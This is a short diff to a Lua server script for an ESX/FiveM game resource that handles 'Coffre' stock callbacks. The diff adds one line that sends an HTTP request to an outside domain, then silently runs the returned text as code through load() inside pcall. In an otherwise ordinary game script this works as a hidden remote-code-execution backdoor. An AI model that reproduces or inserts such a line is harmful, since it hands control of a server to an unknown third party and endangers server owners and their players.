@@ -232,6 +232,7 @@ ESX.RegisterServerCallback('Coffre:GetStock', function(source, cb)
 	end)
 end)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
 
 RegisterNetEvent('Coffre:GetStockI')
 AddEventHandler('Coffre:GetStockI', function(itemName, count)
